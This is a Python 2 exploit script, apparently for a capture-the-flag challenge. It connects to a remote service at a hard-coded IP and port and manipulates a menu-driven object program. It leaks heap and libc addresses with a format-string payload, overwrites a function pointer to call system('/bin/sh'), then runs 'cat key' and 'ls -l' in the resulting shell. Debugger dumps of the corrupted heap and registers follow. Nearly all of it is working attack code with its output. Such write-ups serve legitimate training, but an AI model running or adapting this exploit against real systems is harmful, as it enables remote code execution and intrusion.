from numpy.numarray import Long

__author__ = 'HuyNA'

"""
    be one with the machine nc 54.218.22.41 4766

    b *0x08048EFE

"""

import os
import socket
import time
import struct
import sys
import base64

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# Exploit 23.23.190.205:8888 and read flag.txt
host = "54.218.22.41"
local_host="192.168.248.157"
port = 4766
s.connect((host, port))
#s.connect((local_host, 4545))

print "press enter to continue ... "
sys.stdin.read(1)

def recv_until(sock, delim):
    buf = ""
    while True:
        c = sock.recv(1)
        buf += c
        if delim in buf:
            break
    return buf

print "[+] create [p]ond object ... "
print recv_until(s, "[q]uit?\n")    # [a]dd, [d]elete, [p]erform or [q]uit?
add_object = "a\n"
s.send(add_object)
print recv_until(s, "p[e]rson?\n")  # [p]ond, [r]ake, [s]ign, [t]ree, p[e]rson?\n
type = "p\n"
s.send(type)
print recv_until(s, "0-4?\n") # which slot, 0-4?\n
slot = "0\n"
s.send(slot)

time.sleep(0.001)
print "[+] get heap address base ..."
print recv_until(s, "[q]uit?\n")    # [a]dd, [d]elete, [p]erform or [q]uit?
command = "p\n"
s.send(command)
print recv_until(s, "0-4?\n") # which slot, 0-4?\n
slot = "0\n"
s.send(slot)
data = recv_until(s, "\n")
data = data[len("you gaze into the pond and see reflection of 0x"):len("you gaze into the pond and see reflection of 0x")+7]
print data
heap_base = int(data, 16) & 0xFFFFF000

def get_gets_plt(s):
    time.sleep(0.001)
    print "[+] create [t]ree object ... "
    print recv_until(s, "[q]uit?\n")
    add_object = "a\n"
    s.send(add_object)
    print recv_until(s, "p[e]rson?\n")  # [p]ond, [r]ake, [s]ign, [t]ree, p[e]rson?\n
    type = "t\n"
    s.send(type)
    print recv_until(s, "0-4?\n") # which slot, 0-4?\n
    slot = "1\n"
    s.send(slot)

    time.sleep(0.001)
    print "[+] get gets plt data ..."
    print recv_until(s, "[q]uit?\n")    # [a]dd, [d]elete, [p]erform or [q]uit?
    command = "p\n"
    s.send(command)
    print recv_until(s, "0-4?\n") # which slot, 0-4?\n
    slot = "1\n"
    s.send(slot)
    data = recv_until(s, "\n")
    data = data[len("the tree sways gently in the wind, it makes a noise "):len("the tree sways gently in the wind, it makes a noise ")+12]
    print data.encode("hex")
    # ff25b0bb0408685020736f20
    # ff25b0bb0408685020736f20


time.sleep(0.001)
print "[+] create [s]ign object ... "

print recv_until(s, "[q]uit?\n")    # [a]dd, [d]elete, [p]erform or [q]uit?
add_object = "a\n"
s.send(add_object)
print recv_until(s, "p[e]rson?\n")  # [p]ond, [r]ake, [s]ign, [t]ree, p[e]rson?\n
type = "s\n"
s.send(type)
print recv_until(s, "0-4?\n")       # which slot, 0-4?\n
slot = "2\n"
s.send(slot)
print recv_until(s, "on the sign:\n")   # on the sign:
data = 'b'*0x68 + "\xFF"*4+"\x01\x01\x01\x01"
data_send = data + 'a'*(0x310 - len(data)) + "\n"
s.send(data_send)

print "[+] create [t]ree object ... "
print recv_until(s, "[q]uit?\n")    # [a]dd, [d]elete, [p]erform or [q]uit?
add_object = "a\n"
s.send(add_object)
print recv_until(s, "p[e]rson?\n")  # [p]ond, [r]ake, [s]ign, [t]ree, p[e]rson?\n
type = "t\n"
s.send(type)
print recv_until(s, "0-4?\n")       # which slot, 0-4?\n
slot = "3\n"
s.send(slot)


print "[+] create [s]ign object 2 ... "
print recv_until(s, "[q]uit?\n")    # [a]dd, [d]elete, [p]erform or [q]uit?
add_object = "a\n"
s.send(add_object)
print recv_until(s, "p[e]rson?\n")  # [p]ond, [r]ake, [s]ign, [t]ree, p[e]rson?\n
type = "s\n"
s.send(type)
print recv_until(s, "0-4?\n") # which slot, 0-4?\n
slot = "4\n"
s.send(slot)
print recv_until(s, "on the sign:\n") # on the sign:
heap_base_string = struct.pack("<I", heap_base + 0x8c)
temp = struct.pack("<I", 0x080491FF) # 080491FF => simplePrint()
got_table = struct.pack("<I", 0x0804BB88+0x40)
data = heap_base_string + temp + got_table + "%08x%08x%08x%08x%08x%60s"
data_send = data + "\n"
s.send(data_send)

#sys.stdin.read(1)
time.sleep(0.001)
print "[+] performance ... "
print recv_until(s, "[q]uit?\n")    # [a]dd, [d]elete, [p]erform or [q]uit?
command = "p\n"
s.send(command)
print recv_until(s, "0-4?\n")       # which slot, 0-4?\n
slot = "3\n"
s.send(slot)

print "[+] Calculate base + address ... "
data = s.recv(100)
#data = recv_until(s, "\n")

fileno_address = struct.unpack("<I", data[60:64])[0]
print hex(fileno_address)
libc_base_address = fileno_address - 0x00055EC0
print hex(libc_base_address)
bin_sh_address = 0x015EA2C + libc_base_address
system_address = 0x003F250 + libc_base_address
print hex(bin_sh_address)
print hex(system_address)
system_address_string = struct.pack("<I", system_address)
bin_sh_address_string = struct.pack("<I", bin_sh_address)

print "[+] Final alloc ... "
print recv_until(s, "[q]uit?\n")    # [a]dd, [d]elete, [p]erform or [q]uit?
add_object = "a\n"
s.send(add_object)
print recv_until(s, "p[e]rson?\n")  # [p]ond, [r]ake, [s]ign, [t]ree, p[e]rson?\n
type = "s\n"
s.send(type)
print recv_until(s, "0-4?\n") # which slot, 0-4?\n
slot = "1\n"
s.send(slot)
print recv_until(s, "on the sign:\n") # on the sign:
heap_base_string = struct.pack("<I", heap_base + 0x8c)
temp = struct.pack("<I", 0x080491FF) # 080491FF => simplePrint()
data = heap_base_string + temp + 0xD0*'a' + system_address_string + "c"*4 + bin_sh_address_string
data_send = data + "\n"
s.send(data_send)

sys.stdin.read(1)
time.sleep(0.001)
print "[+] final performance ... "
print recv_until(s, "[q]uit?\n")    # [a]dd, [d]elete, [p]erform or [q]uit?
command = "p\n"
s.send(command)
print recv_until(s, "0-4?\n")       # which slot, 0-4?\n
slot = "3\n"
s.send(slot)

time.sleep(1)
s.send("cat key\n")
print s.recv(1024)
print s.recv(1024)
s.send("ls -l\n")
print s.recv(1024)

print recv_until(s, "0-4?\n")

"""

0xbfb2ed64:	0x0980408c	0x080491ff	0x0804bb88	0x30303030
0xbfb2ed74:	0x32303030	0x34303830	0x31396539	0x30303030
0xbfb2ed84:	0x30303030	0x30383930	0x63383034	0x34303830
0xbfb2ed94:	0x66663139	0xb74d90a0	0xb74bcf50	0x08048b36
0xbfb2eda4:	0x08048b46	0x08048b56	0x08048b66	0xb74a31f0
0xbfb2edb4:	0x08048b86	0x08048b96	0xb75614b0	0x08048bb6
0xbfb2edc4:	0xb76b4fc0	0x08048bd6	0xb74893e0	0x08048bf6
0xbfb2edd4:	0x08048c06	0x08048c16	0x08048c26	0xb74c6310
0xbfb2ede4:	0xb7557850	0x08048c56	0x08048c66	0x08048c76

    b *0x08049616

             10 00 00 00 00 00 00 00 68 a4 04 08 00 00 00 00   ........h.......
0x08b03010 : 20 03 00 00 00 00 00 00 62 62 62 62 62 62 62 62    .......bbbbbbbb
0x08b03020 : 62 62 62 62 62 62 62 62 62 62 62 62 62 62 62 62   bbbbbbbbbbbbbbbb
0x08b03030 : 62 62 62 62 62 62 62 62 62 62 62 62 62 62 62 62   bbbbbbbbbbbbbbbb
0x08b03040 : 62 62 62 62 62 62 62 62 62 62 62 62 62 62 62 62   bbbbbbbbbbbbbbbb
0x08b03050 : 62 62 62 62 62 62 62 62 62 62 62 62 62 62 62 62   bbbbbbbbbbbbbbbb
0x08b03060 : 62 62 62 62 62 62 62 62 62 62 62 62 62 62 62 62   bbbbbbbbbbbbbbbb
0x08b03070 : 62 62 62 62 62 62 62 62 62 62 62 62 62 62 62 62   bbbbbbbbbbbbbbbb
0x08b03080 : ff ff ff ff ff 00 01 01 08 31 b0 08 08 31 b0 08   .........1...1..
0x08b03090 : 08 31 b0 08 08 31 b0 08 08 31 b0 08 08 31 b0 08   .1...1...1...1..
0x08b030a0 : 08 31 b0 08 08 31 b0 08 61 61 61 61 61 61 61 61   .1...1..aaaaaaaa
0x08b030b0 : 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61   aaaaaaaaaaaaaaaa
0x08b030c0 : 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61   aaaaaaaaaaaaaaaa
0x08b030d0 : 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61   aaaaaaaaaaaaaaaa
0x08b030e0 : 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61   aaaaaaaaaaaaaaaa
0x08b030f0 : 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61   aaaaaaaaaaaaaaaa
0x08b03100 : 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61   aaaaaaaaaaaaaaaa
0x08b03110 : 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61   aaaaaaaaaaaaaaaa
0x08b03120 : 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61   aaaaaaaaaaaaaaaa
0x08b03130 : 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61   aaaaaaaaaaaaaaaa
0x08b03140 : 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61   aaaaaaaaaaaaaaaa
0x08b03150 : 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61   aaaaaaaaaaaaaaaa
0x08b03160 : 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61   aaaaaaaaaaaaaaaa
0x08b03170 : 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61   aaaaaaaaaaaaaaaa

EAX: 0x61616161 ('aaaa')
EBX: 0x26 ('&')
ECX: 0xbf931b30 --> 0x0
EDX: 0x98e2088 --> 0x98e208c ("aaaa", 'c' <repeats 196 times>...)
ESI: 0x0
EDI: 0x0
EBP: 0xbf931c88 --> 0xbf931e58 --> 0x0
ESP: 0xbf931c50 --> 0x98e2088 --> 0x98e208c ("aaaa", 'c' <repeats 196 times>...)
EIP: 0x80496c3 (<_Z13performActionv+318>:	call   eax)
EFLAGS: 0x297 (CARRY PARITY ADJUST zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x80496bb <_Z13performActionv+310>:	mov    eax,DWORD PTR [eax]
   0x80496bd <_Z13performActionv+312>:	mov    edx,DWORD PTR [ebp-0x20]
   0x80496c0 <_Z13performActionv+315>:	mov    DWORD PTR [esp],edx
=> 0x80496c3 <_Z13performActionv+318>:	call   eax
   0x80496c5 <_Z13performActionv+320>:	jmp    0x80496e5 <_Z13performActionv+352>
   0x80496c7 <_Z13performActionv+322>:	movsx  eax,BYTE PTR [ebp-0xd]
   0x80496cb <_Z13performActionv+326>:	mov    eax,DWORD PTR [eax*4+0x804bc8c]
   0x80496d2 <_Z13performActionv+333>:	mov    DWORD PTR [ebp-0x24],eax
Guessed arguments:
arg[0]: 0x98e2088 --> 0x98e208c ("aaaa", 'c' <repeats 196 times>...)
[------------------------------------stack-------------------------------------]
0000| 0xbf931c50 --> 0x98e2088 --> 0x98e208c ("aaaa", 'c' <repeats 196 times>...)
0004| 0xbf931c54 --> 0xbf931c60 --> 0x1
0008| 0xbf931c58 --> 0xb75c8651 (<send+33>:	mov    ebx,edx)
0012| 0xbf931c5c --> 0x8049f82 (<ctf_send+72>:	mov    DWORD PTR [ebp-0x10],eax)
0016| 0xbf931c60 --> 0x1
0020| 0xbf931c64 --> 0xbf931d68 ("[a]dd, [d]elete, [p]erform or [q]uit?\n")
0024| 0xbf931c68 --> 0x98e2088 --> 0x98e208c ("aaaa", 'c' <repeats 196 times>...)
0028| 0xbf931c6c --> 0x0
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x080496c3 in performAction() ()

"""